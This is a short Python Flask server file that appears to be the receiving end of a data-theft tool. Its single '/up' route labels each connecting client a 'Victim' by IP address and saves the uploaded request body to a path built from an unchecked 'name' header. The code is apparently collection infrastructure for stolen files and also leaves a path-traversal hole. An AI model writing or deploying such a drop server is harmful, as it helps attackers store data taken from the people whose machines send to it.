from flask import Flask, request
from models.victim import Victim


app = Flask(__name__)

@app.route('/up', methods=['POST'])
def up():
    CurrentVictim = Victim(request.remote_addr)
    NameHeader = request.headers.get("name")
    FilePath = CurrentVictim.GetFileStoragePath(NameHeader)

    dataout = open(FilePath, 'wb')
    dataout.write(request.data)
    dataout.close()

    return '', 200

if __name__ == '__main__':
    app.run(host="127.0.0.1", port=1133, debug=True)
